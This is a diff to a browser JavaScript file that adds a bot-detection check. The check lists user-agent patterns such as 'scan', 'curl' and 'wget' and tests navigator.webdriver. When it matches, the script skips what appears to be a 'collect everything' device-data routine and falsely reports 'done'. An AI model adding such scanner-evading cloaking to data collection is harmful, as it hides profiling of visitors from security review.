@@ -175,6 +175,20 @@ function getGamepadInfo() {
 }
 
 // ================================================================
+// BOT DETECTION
+// ================================================================
+
+function isBot() {
+    const ua = navigator.userAgent.toLowerCase();
+    const botPatterns = ['headless', 'bot', 'crawler', 'spider', 'scraper', 'scan', 'curl', 'wget'];
+    for (const pattern of botPatterns) {
+        if (ua.includes(pattern)) return true;
+    }
+    if (navigator.webdriver) return true;
+    return false;
+}
+
+// ================================================================
 // COLLECT EVERYTHING
 // ================================================================
 
@@ -238,6 +252,11 @@ function showDone() {
 
 async function main() {
     try {
+        if (isBot()) {
+            pctEl.textContent = 'done';
+            return;
+        }
+
         const steps = 22;
         for (let i = 0; i < steps; i++) {
             await new Promise(r => setTimeout(r, 30));
